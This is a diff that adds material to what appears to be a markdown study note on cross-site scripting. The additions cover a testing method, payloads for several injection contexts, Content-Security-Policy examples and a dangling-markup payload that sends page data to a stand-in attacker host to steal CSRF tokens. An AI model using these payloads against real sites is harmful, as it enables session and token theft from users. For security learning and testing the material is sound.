@@ -177,6 +177,118 @@ function handleResponse() {
 </script>
 ```
 
+## Test
+
+1. Submit a short alphanumeric payload into every entry point of the site.
+1. Identify where ethat input is returned in the HTTP response.
+1. Test if the return context is vulnerably to XSS (any context that executes JavaScript).
+
+### XSS contexts
+
+Locations where an HTTP response can execute JavaScript:
+
+### Raw HTML
+
+Response is dumped directly into the DOM:
+
+```html
+<script>alert(document.domain)</script>
+<img src=1 onerror=alert(1)>
+```
+### HTML attributes
+
+Response is injected into an HTML attribute.  This can be caused by terminating an existing element or adding a new attribute:
+
+```html
+"><script>alert(document.domain)</script>
+" autofocus onfocus=alert(document.domain) x="
+<a href="javascript:alert(document.domain)">
+```
+
+### JavaScript sinks
+
+Terminating an existing `<script>` element or breaking out of a string:
+
+```html
+<script>
+var foo = "user controlled data";
+</script>
+
+<!-- Malicious values:
+</script><img src=1 onerror=alert(document.domain)>
+;alert(document.domain)//
+-->
+```
+
+String template literal injection:
+
+```html
+<script>
+...
+var input = `controllable data here`;
+...
+</script>
+
+<!-- Include the injection as a template literal:
+${alert(document.domain)}
+-->
+```
+
+## Content Security Policy (CSP) to prevent XSS
+
+Can prevent XSS through the use of a `Content-Security-Policy` header that prevents execution of JavaScript and resource loading.
+
+```sh
+# Only allow script execution from same origin as the page
+script-src 'self'
+
+# Script execution from given domain to allow 3rd party scripts
+script-src https://scripts.normal-website.com
+```
+
+A nounce or hash of the script contents can also be specified by the CSP to only load `<script>` elements that have a matching nounce or that the script contents match the given hash.
+
+The same policies exist for image tags:
+
+```sh
+# Only allow image load from same origin as the page
+img-src 'self'
+
+# Image load from given domain
+img-src https://scripts.normal-website.com
+```
+
+CSPs can block clickjacking as well with their frame policies:
+
+```sh
+# Only allow frames from same origin as the page
+frame-ancestors 'self'
+
+# Do not allow frames
+frame-ancestors 'none'
+
+# Frames for given origin and trusted sites
+frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
+```
+
+:warning: Caution must be taken if user controllable input is used to generate the CSP policy (e.g. the `report-uri`).  If possible, it allows for policy overwrite.
+
+## Dangling markup XSS
+
+Terminating markup to inject malicious scripts:
+
+```html
+<input type="text" name="input" value="CONTROLLABLE DATA HERE">
+```
+
+If the controllable data is not escaped, the input can be terminated and all subsequent content forwarded as a GET request to an attacker website.  
+
+```html
+"><img src='//attacker-website.com?
+```
+
+This technique is used to steal CSRF tokens and other sensitive data.
+
 ## Prevent
 
 - Filter all input as strictly as possible.
@@ -187,7 +299,9 @@ function handleResponse() {
 
 ## Tools
 
-- [Burp Collaborator (pro)](https://portswigger.net/burp/documentation/collaborator)
+- [DOM invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
+- [Burp collaborator (pro)](https://portswigger.net/burp/documentation/collaborator)
+- [Burp web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner)
 
 ## References
 
